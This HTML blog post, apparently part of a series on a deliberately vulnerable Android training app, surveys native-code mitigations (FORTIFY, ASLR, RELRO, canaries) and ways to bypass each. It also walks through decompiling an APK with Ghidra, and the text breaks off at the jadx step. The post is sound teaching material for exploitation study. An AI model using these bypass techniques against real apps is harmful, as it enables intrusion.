&lt;h2 id="overview-of-security-mechanisms-on-android">Overview of Security Mechanisms on Android&lt;/h2>
&lt;p>Next, via a non - exhaustive list of security mechanisms we will dive into the details of how Android makes life of an attacker (a bit) harder. If possible, we will try to figure out a way to bypass each security mechanism through additional assumptions.&lt;/p>
&lt;h3 id="permissions">Permissions&lt;/h3>
&lt;p>As usual, an app has certain permissions to access specific data or perform specific actions. E.g. in order to create a connection to a remote host via &lt;a href="https://docs.oracle.com/javase/7/docs/api/java/net/Socket.html">&lt;code>java.net.Socket&lt;/code>&lt;/a>, an app has to declare the install - time permission &lt;a href="https://developer.android.com/reference/android/Manifest.permission#INTERNET">&lt;code>android.permission.INTERNET&lt;/code>&lt;/a> in its manifest. If a permission is not declared (install - time) or not granted (runtime), then the app will not be able to provide the functionality that needs the respective permission(s).&lt;/p>
&lt;p>Continuing the example above, if we somehow manage to get abitrary code execution inside of an Android app, but the app does not declare &lt;code>android.permission.INTERNET&lt;/code>, then we will not be able to create a socket connection to call back to our netcat - listener for a reverse shell.&lt;/p>
&lt;p>Permissions can further be divided into&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://developer.android.com/guide/topics/permissions/overview#install-time">Install - time permissions&lt;/a>: System automatically grants these upon installation. These permissions can be further classified into
&lt;ol>
&lt;li>&lt;a href="https://developer.android.com/guide/topics/permissions/overview#normal">Normal permissions&lt;/a>: Allow for access to data and actions beyond the app&amp;rsquo;s sandbox.&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/guide/topics/permissions/overview#signature">Signature permissions&lt;/a>: Irrelevant for now!&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/guide/topics/permissions/overview#runtime">Runtime permissions&lt;/a>: User will be shown a permission prompt that specifically asks for a potentially dangerous permission. These prompts will be presented only if the app is running/starting.&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/guide/topics/permissions/overview#special">Special permissions&lt;/a>: Irrelevant for now! We assume an app that is not even capable of specifying these permissions.&lt;/li>
&lt;/ol>
&lt;p>Assuming source code access and thus access to &lt;code>AndroidManifest.xml&lt;/code>, we can deduce which actions are allowed in our shellcode. Another (naive) assumption is to believe that an app is incapable of adding additional permissions without a user&amp;rsquo;s consent via publicly known means (otherwise this would be a severe security issue). Of couse, our shellcode could try to present the user permission prompts that give us further tools to play with, but this is &lt;strong>far from stealthy&lt;/strong>!&lt;/p>
&lt;p>Summarizing, a shellcode is limited to the app&amp;rsquo;s permissions. Theoretically it is possible for shellcode to request runtime permissions &amp;hellip; at runtime. It would be interesting to see whether it is possible to request install - time permissions at runtime.&lt;/p>
&lt;h3 id="fortify">FORTIFY&lt;/h3>
&lt;p>This mechanism adds additional compile - time and/or runtime checks to the C standard library. These are mainly memory - related checks, e.g.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">struct&lt;/span> Foo {
&lt;span style="color:#66d9ef">int&lt;/span> val;
&lt;span style="color:#66d9ef">struct&lt;/span> Foo &lt;span style="color:#f92672">*&lt;/span>next;
};
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">initFoo&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Foo &lt;span style="color:#f92672">*&lt;/span>f) {
memset(&lt;span style="color:#f92672">&amp;amp;&lt;/span>f, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> Foo));
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>will not work, because &lt;em>FORTIFY&lt;/em> is able to detect the 8 - byte overflow at compile - time (example taken from &lt;a href="https://android-developers.googleblog.com/2017/04/fortify-in-android.html">here&lt;/a>).&lt;/p>
&lt;p>At compile - time, &lt;em>FORTIFY&lt;/em> will block compilation, if it is able to detect a bad call to a standard library function like e.g. &lt;code>memset&lt;/code>. If &lt;em>FORTIFY&lt;/em> is missing information or is very certain that a call is safe, then &lt;em>FORTIFY&lt;/em> will be not be part of the process image. Finally, if there is a call, but &lt;em>FORTIFY&lt;/em> is not sure whether the call is safe or not, it will redirect the call to a special &lt;em>FORTIFY&lt;/em>&amp;lsquo;ed version of the called function, which applies additional checks to ensure correct usage of the function.&lt;/p>
&lt;p>Lets consider an Android - related example of the function &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/libc/include/bits/fortify/string.h;l=122;bpv=0;bpt=1">&lt;code>memset&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">__BIONIC_FORTIFY_INLINE
&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">memset&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> s __pass_object_size0, &lt;span style="color:#66d9ef">int&lt;/span> c, size_t n) __overloadable
&lt;span style="color:#75715e">/* If you&amp;#39;re a user who wants this warning to go away: use `(&amp;amp;memset)(foo, bar, baz)`. */&lt;/span>
__clang_warning_if(c &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>n, &lt;span style="color:#e6db74">&amp;#34;&amp;#39;memset&amp;#39; will set 0 bytes&lt;/span>; maybe the arguments got flipped&lt;span style="color:#f92672">?&lt;/span>&lt;span style="color:#e6db74">&amp;#34;) {&lt;/span>
&lt;span style="color:#75715e">#if __ANDROID_API__ &amp;gt;= 17 &amp;amp;&amp;amp; __BIONIC_FORTIFY_RUNTIME_CHECKS_ENABLED
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">__builtin___memset_chk&lt;/span>(s, c, n, __bos0(s));
&lt;span style="color:#75715e">#else
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">__builtin_memset&lt;/span>(s, c, n);
&lt;span style="color:#75715e">#endif
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>As these are builtins, they are implemented by the compiler and thus pretty hard to track down (if you are interested, consider code that looks like a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/clang/lib/Sema/SemaChecking.cpp;l=974">compile - time check&lt;/a> and a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/clang/lib/CodeGen/CGBuiltin.cpp;l=1052">runtime - check&lt;/a>; no guarantees that these references are what is actually being called!).&lt;/p>
&lt;p>Sooo&amp;hellip;how to break it? Apparently, if &lt;em>FORTIFY&lt;/em> is lacking information, it will just give up. The developers gave a pretty nice &lt;a href="https://android-developers.googleblog.com/2017/04/fortify-in-android.html">example&lt;/a> for &lt;em>FORTIFY&lt;/em>&amp;rsquo;s limitations:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">__attribute__((noinline)) &lt;span style="color:#75715e">// Tell the compiler to never inline this function.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">inline&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> intToStr(&lt;span style="color:#66d9ef">int&lt;/span> i, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>asStr) { sprintf(asStr, &lt;span style="color:#e6db74">&amp;#34;%d&amp;#34;&lt;/span>, i); }
&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>intToDupedStr(&lt;span style="color:#66d9ef">int&lt;/span> i) {
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> MAX_INT_STR_SIZE &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;2147483648&amp;#34;&lt;/span>); &lt;span style="color:#75715e">// MAX_INT_STR_SIZE = 11 = 10 + 1
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> buf[MAX_INT_STR_SIZE];
intToStr(i, buf);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">strdup&lt;/span>(buf);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Setting &lt;code>i = -2147483648&lt;/code> (which is &lt;code>0x80000000&lt;/code>, because of 2&amp;rsquo;s - complement for 4 - byte values) would result in an off - by - one bug, because &lt;code>buf&lt;/code> is a buffer of &lt;code>11&lt;/code> elements, the last of which is supposed to be a null - terminator. Because &lt;code>sprintf&lt;/code> will also put a &lt;code>-&lt;/code> sign into &lt;code>buf&lt;/code>, the null - terminator will be moved back by one and therefore overwrite the least - significant byte of the next qword on the stack. If &lt;code>rbp&lt;/code> was modified, then this would most likely crash the entire program. &lt;em>FORTIFY&lt;/em> does &lt;strong>not&lt;/strong> catch this bug, because from the perspective of &lt;code>intToStr&lt;/code>, &lt;em>FORTIFY&lt;/em> cannot &amp;ldquo;see&amp;rdquo; the allocation of &lt;code>buf&lt;/code>. Neither can &lt;em>FORTIFY&lt;/em> determine for sure the size of a &lt;code>char*&lt;/code>, which could be of arbitrary length, nor can it determine where &lt;code>buf&lt;/code> is pointing to (&lt;code>stack&lt;/code>, &lt;code>heap&lt;/code>, &lt;code>.bss&lt;/code>, &lt;code>.data&lt;/code>, &amp;hellip;).&lt;/p>
&lt;p>Observe that &lt;em>FORTIFY&lt;/em> makes it significantly harder for developers to write vulnerable code. Still, if developers decide to implement their own versions of e.g. &lt;code>memcpy&lt;/code> this fully bypasses &lt;em>FORTIFY&lt;/em>. Also, as can be seen in the above example, there are settings, in which &lt;em>FORTIFY&lt;/em> cannot help, i.e. e.g. if the allocation of a buffer takes place in a different function and this buffer is passed as a &lt;code>type*&lt;/code>.&lt;/p>
&lt;h3 id="on-defeating-pies">On defeating PIEs&lt;/h3>
&lt;p>When building native apps on Android via &lt;em>Android Studio&lt;/em>, we will almost always use &lt;a href="https://cmake.org/cmake/help/latest/command/add_library.html">cmake&amp;rsquo;s &lt;code>add_library&lt;/code>&lt;/a> with the &lt;code>SHARED&lt;/code> flag. This will encapsulate the native code into a &lt;a href="https://developer.android.com/studio/projects/configure-cmake#create_script">&lt;code>lib&amp;lt;somename&amp;gt;.so&lt;/code>&lt;/a> file, which is actually a shared - object file (&lt;a href="http://www.sco.com/developers/gabi/latest/contents.html">ELF&lt;/a>). According to &lt;a href="https://cmake.org/cmake/help/latest/command/add_library.html">documentation&lt;/a>, for such &lt;code>SHARED&lt;/code> libraries the property &lt;code>POSITION_INDEPENDENT_CODE&lt;/code> is automatically set to &lt;code>ON&lt;/code>, thus resulting in Position - Independent - Executables (PIEs; To be precise with terminology, the shared - object file contains Position - Independent - Code (PIC). From &lt;em>ELF&amp;rsquo;s&lt;/em> perspective, not every shared - object file is an executable and vice versa).&lt;/p>
&lt;p>When calling &lt;code>System.loadLibrary(&amp;quot;xyz&amp;quot;)&lt;/code>, we can trace down the call hierarchy to versions of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:art/runtime/jni/java_vm_ext.cc;l=1003;bpv=0;bpt=0">&lt;code>dlopen&lt;/code>&lt;/a>, which is implemented in the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/linker/linker.cpp;l=2063;bpv=0;bpt=1">linker&lt;/a>. Finally, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/linker/linker_phdr.cpp;l=561">&lt;code>ReserveWithAlignmentPadding&lt;/code>&lt;/a> will be called, which returns a &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/linker/linker_phdr.cpp;l=623">randomized base address&lt;/a>. This confirms that when loading native shared - object files, they will have &lt;a href="https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html">ASLR&lt;/a> enabled by default.&lt;/p>
&lt;p>Defeating ASLR is thus key to handling binary exploitation in PIEs. This can be archieved in numerous ways. The following is a non - exhaustive list of possible ways to break ASLR:&lt;/p>
&lt;ol>
&lt;li>Leaking an address from e.g. a code region. It seems that the random shift used for the stack (and heap etc.) and a loaded shared - object file differ. This follows from the &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/linker/linker_phdr.cpp;l=623">randomized base address&lt;/a>, which is different on each execution of &lt;code>ReserveWithAlignmentPadding&lt;/code>.&lt;/li>
&lt;li>Abusing a side channel that allows for brute - forcing / leaking bytes of an address one by one instead of being forced into brute - forcing / leaking the entire address at once.&lt;/li>
&lt;li>From &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:bionic/linker/linker_phdr.cpp;l=626">&lt;code>ReserveWithAlignmentPadding&lt;/code>&lt;/a>, by probing for accessible memory mappings. Depending on the app, we might be able to even distinguish different kinds of errors / signals when accessing / returning to invalid memory. However, for memory probing to work the process should not crash upon signals like &lt;code>SIGSEG&lt;/code> or &lt;code>SIGILL&lt;/code>, which is very rare.&lt;/li>
&lt;/ol>
&lt;h3 id="full-relro">Full RELRO&lt;/h3>
&lt;p>With the above security mechanisms in place, it would still be &amp;ldquo;easy&amp;rdquo; to abuse a leak combined with a &lt;em>Write - What - Where&lt;/em> condition, as e.g. &lt;code>.got&lt;/code> is still writable. E.g. overwriting a &lt;code>.got&lt;/code> entry of &lt;code>strlen&lt;/code> that is given a string of our choice could result in a redirection to &lt;code>system&lt;/code> (for a more detailed discussion, see &lt;a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">this blog post&lt;/a>). This is, among other things, prevented by full / partial &lt;em>Relocations Read - Only&lt;/em>, i.e. full / partial &lt;em>RELRO&lt;/em>, which can be &lt;a href="https://source.android.com/docs/security/enhancements/enhancements41">enabled&lt;/a> on Android. Full &lt;em>RELRO&lt;/em> marks certain memory regions, like e.g. &lt;code>.got&lt;/code>, as read - only after program startup. It seems that it is enabled by default, when creating a new native android app in Android Studio.&lt;/p>
&lt;p>Now the question arises, how this mitigation can be circumvented. This again depends on the app. Lets consider the non - exhaustive list:&lt;/p>
&lt;ol>
&lt;li>Given a &lt;em>Write - What - Where&lt;/em> condition and knowledge on all addresses:
&lt;ol>
&lt;li>Try to find and overwrite a global variable (located in &lt;code>.bss&lt;/code> or &lt;code>.data&lt;/code>) that impacts the control flow, e.g. a function pointer.&lt;/li>
&lt;li>Overwrite the return address on the stack to return to a &lt;a href="https://ctf101.org/binary-exploitation/return-oriented-programming/">ROP - chain&lt;/a> located &amp;ldquo;somewhere else&amp;rdquo;.&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Given access to &lt;code>mprotect&lt;/code>:
&lt;ol>
&lt;li>Call &lt;code>mprotect&lt;/code> on &lt;code>.got&lt;/code> to make it writable again.&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h3 id="non---executable-stack-and-heap">Non - executable Stack (and Heap)&lt;/h3>
&lt;p>As has been the case for decades, the &lt;a href="https://source.android.com/docs/security/enhancements/enhancements41">stack and heap is marked as non - executable&lt;/a> by default. Thus, calling your classical NOP - sledge for help won&amp;rsquo;t do any good.&lt;/p>
&lt;p>(Un-)fortunately, the stack and heap can be used to store gadgets for a ROP - chain.&lt;/p>
&lt;h3 id="canaries-and-cookies">Canaries and cookies&lt;/h3>
&lt;p>Depending on how a native function is implemented and compiled, it can be given a stack canary. This canary aims to protect the stack frame, i.e. the return address and stored &lt;code>rbp&lt;/code>, from potential buffer overflows on the stack. In our case, this canary is an 8 - byte random value that is very hard to predict. Doing the math reveals that we have a &lt;code>1/(2^64)&lt;/code> chance to hit the correct canary. This is why we often assume that there is some kind of leak that (partially) reveals the canary (bytes). Naturally, two approaches come to mind when thinking of &amp;ldquo;leaking an 8 byte random value&amp;rdquo;:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Reading it directly from the stack. Trivially, this will reveal the value.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Brute - forcing it via a side channel. The side channel could be e.g. an oracle that either says&lt;/p>
&lt;ul>
&lt;li>&amp;ldquo;Canary is correct&amp;rdquo;, i.e. process keeps running&lt;/li>
&lt;li>&amp;ldquo;Canary is incorrect&amp;rdquo;, i.e. process crashes.&lt;/li>
&lt;/ul>
&lt;p>If we overwrite just the least - significant byte of the canary, this byte will be in either of the above categories. If the process does not crash, we can continue with the next canary byte until all 8 bytes are leaked.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>So, why would the latter approach work? The canary will be consisting of 8 random bytes for each process start, right? Right? No! Not going into the &lt;a href="https://link.springer.com/article/10.1007/s10207-018-00425-8">details&lt;/a>, the underlying syscall &lt;code>fork&lt;/code>, which is used to spawn &lt;em>damnvulnerableapp&lt;/em> and its subprocess that is running the vulnerable module, will be called from the same parent process (zygote) over and over again, i.e. for &lt;strong>each&lt;/strong> app. Therefore, apps contain large duplicated memory regions, canary included.&lt;/p>
&lt;h2 id="getting-the-source">Getting the source&lt;/h2>
&lt;p>And now for something completely different. Well, technically speaking it is not &lt;em>that&lt;/em> different, because packing the source code could be considered a form of obfuscation, which again could be considered a security precaution. Now we will take the perspective of an attacker that tries to get access to the source code of an app while only having access to an app&amp;rsquo;s &lt;code>apk&lt;/code> file.&lt;/p>
&lt;h3 id="finding-the-apk-file">Finding the &lt;em>apk&lt;/em> file&lt;/h3>
&lt;p>There are numerous ways to get an &lt;code>apk&lt;/code> file of an app, among which the following seem to be the easiest ones:&lt;/p>
&lt;ol>
&lt;li>Use &lt;em>Android Studio&lt;/em> to build the app and search for the &lt;code>apk&lt;/code> file in the directory tree of the app. This implies source code access and therefore makes analyzing an &lt;code>apk&lt;/code> file obsolete, but it is a way.&lt;/li>
&lt;li>Assuming root access on an Android device / emulator, user - installed apps can be found at e.g. &lt;code>/data/app/&lt;/code>. There can be a corresponding &lt;code>.apk&lt;/code> file to grab for further static analysis (this might depend on the Android version).&lt;/li>
&lt;/ol>
&lt;h3 id="unpacking-apk-files">Unpacking &lt;em>apk&lt;/em> files&lt;/h3>
&lt;p>Assuming we grabbed ourselves an &lt;code>apk&lt;/code> file, we can start analyzing it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ file base.apk
base.apk: Zip archive data, at least v?&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">]&lt;/span> to extract
$ unzip base.apk -d ./base
...
$ ls base
AndroidManifest.xml classes10.dex classes11.dex classes2.dex classes3.dex classes4.dex classes5.dex classes6.dex classes7.dex classes8.dex classes9.dex classes.dex lib META-INF res resources.arsc
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Going from here we can easily access the native libraries that are part of the app:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ls base/lib/x86_64
libDoubleFreeModule.so libEasyStackBufferOverflowModule.so libHeapOverflowModule.so libOffByOneModule.so libStackBufferOverflowModule.so libUseAfterFreeExecModule.so libUseAfterFreeWriteModule.so
&lt;/code>&lt;/pre>&lt;/div>&lt;p>These shared - object files can later be used for finding gadgets and so on. Further they can be analyzed / decompiled via e.g. &lt;a href="https://ghidra-sre.org/">&lt;em>Ghidra&lt;/em>&lt;/a>. The decompiled code of &lt;code>logMessage#libOffByOneModule.so&lt;/code> could look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">undefined8
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_OffByOneModule_logMessage&lt;/span>
(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>param_1,undefined8 param_2,undefined8 param_3)
{
&lt;span style="color:#66d9ef">int&lt;/span> iVar1;
undefined4 uVar2;
undefined8 uVar3;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>pvVar4;
undefined8 uVar5;
&lt;span style="color:#66d9ef">long&lt;/span> in_FS_OFFSET;
&lt;span style="color:#66d9ef">int&lt;/span> local_cc;
undefined8 local_a0;
timespec local_28;
undefined local_11;
&lt;span style="color:#66d9ef">long&lt;/span> local_10;
local_10 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>);
uVar3 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x5c0&lt;/span>))(param_1,param_3,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_11);
DAT_00103028 &lt;span style="color:#f92672">=&lt;/span> DAT_00103028 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
DAT_00103020 &lt;span style="color:#f92672">=&lt;/span> realloc(DAT_00103020,DAT_00103028 &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x108&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (DAT_00103020 &lt;span style="color:#f92672">==&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x0&lt;/span>) {
local_a0 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">else&lt;/span> {
pvVar4 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)DAT_00103020 &lt;span style="color:#f92672">+&lt;/span> (DAT_00103028 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">0x108&lt;/span>);
__memset_chk(pvVar4,&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0x108&lt;/span>,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
__memcpy_chk((&lt;span style="color:#66d9ef">long&lt;/span>)pvVar4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_FUN_00103010,&lt;span style="color:#ae81ff">8&lt;/span>,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
local_cc &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x558&lt;/span>))(param_1,param_3);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x100&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> local_cc &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
local_cc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>;
}
__memcpy_chk(pvVar4,uVar3,(&lt;span style="color:#66d9ef">long&lt;/span>)local_cc,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
iVar1 &lt;span style="color:#f92672">=&lt;/span> clock_gettime(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#f92672">&amp;amp;&lt;/span>local_28);
&lt;span style="color:#66d9ef">if&lt;/span> (iVar1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
local_28.tv_nsec &lt;span style="color:#f92672">=&lt;/span> local_28.tv_nsec &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>;
}
uVar5 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)((&lt;span style="color:#66d9ef">long&lt;/span>)pvVar4 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x100&lt;/span>))(pvVar4,(&lt;span style="color:#66d9ef">long&lt;/span>)local_cc);
uVar2 &lt;span style="color:#f92672">=&lt;/span> __strlen_chk(uVar5,&lt;span style="color:#ae81ff">0xffffffffffffffff&lt;/span>);
local_a0 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x580&lt;/span>))(param_1,uVar2);
(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x680&lt;/span>))(param_1,local_a0,&lt;span style="color:#ae81ff">0&lt;/span>,uVar2,uVar5);
(&lt;span style="color:#f92672">**&lt;/span>(code &lt;span style="color:#f92672">**&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x600&lt;/span>))(param_1,param_3,uVar3,&lt;span style="color:#ae81ff">2&lt;/span>);
}
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(in_FS_OFFSET &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x28&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> local_10) {
&lt;span style="color:#66d9ef">return&lt;/span> local_a0;
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
__stack_chk_fail();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order to not being forced into manually setting up the jni type definitions, see either &lt;a href="https://github.com/extremecoders-re/ghidra-jni">&lt;code>jni_all.h&lt;/code>&lt;/a> or &lt;a href="https://gist.github.com/jcalabres/bf8d530b3f18c30ca6f66388357b1d91">&lt;code>jni_all.h&lt;/code>&lt;/a>. When in the &lt;em>CodeBrowser&lt;/em>, try running &lt;em>File -&amp;gt; Parse C Source&amp;hellip;&lt;/em>, add the corresponding file to &amp;ldquo;Source files to parse&amp;rdquo;, choose the correct base profile (&amp;ldquo;parse configuration&amp;rdquo;) and set the parse options to e.g. &lt;a href="https://github.com/extremecoders-re/ghidra-jni#how-to-load-in-ghidra">this&lt;/a>.&lt;/p>
&lt;p>To be more precise, first download any of the above mentioned &lt;code>jni_all.h&lt;/code> files. Then open &lt;em>File -&amp;gt; Parse C Source&amp;hellip;&lt;/em>. You should be prompted with the following window:
&lt;img src="https://lolcads.github.io/2024/07/eva_1_ghidra_parse_c_source.png" alt="Parse C Source Window">&lt;/p>
&lt;p>Next, choose an existing profile as a base profile. E.g. choose &lt;code>generic_clib_32.prf&lt;/code> and click on the &lt;em>Save profile to new name&lt;/em> button (upper right corner). Then choose a name that you recognize:
&lt;img src="https://lolcads.github.io/2024/07/eva_1_ghidra_save_new_profile.png" alt="Save New Profile">&lt;/p>
&lt;p>After giving the new profile a nice name, we need to adjust the parse options. E.g. you can copy them over from &lt;a href="https://github.com/extremecoders-re/ghidra-jni#how-to-load-in-ghidra">here&lt;/a>. &lt;strong>Do not overwrite -I options&lt;/strong>:
&lt;img src="https://lolcads.github.io/2024/07/eva_1_ghidra_parse_options.png" alt="Parse Options">&lt;/p>
&lt;p>Finally, add &lt;code>jni_all.h&lt;/code> to the &lt;em>Source files to parse&lt;/em> panel by clicking on the green plus sign to the right. This should open &lt;em>files&lt;/em>. Navigate to &lt;code>jni_all.h&lt;/code> and open it. You should see a new entry if you scrolled all the way down. Now click the &lt;em>Save profile&lt;/em> button at the top and then &lt;em>Parse to program&lt;/em> at the bottom. If you now retype a variable, e.g. the first argument of a JNI function to &lt;code>JNIEnv*&lt;/code>, you will see actual function names like &lt;code>NewByteArray&lt;/code> etc.&lt;/p>
&lt;p>Now we are just missing the Java code that calls this native function&amp;hellip;&lt;/p>
&lt;h3 id="getting-java-code">Getting Java code&lt;/h3>
&lt;p>In order to obtain the Java code of an app, an attacker could utilize a tool like &lt;a href="https://github.com/skylot/jadx">&lt;em>jadx&lt;/em>&lt;/a>. This basically reconstructs the project structure we see in &lt;em>Android Studio&lt;/em>:&lt;/p>
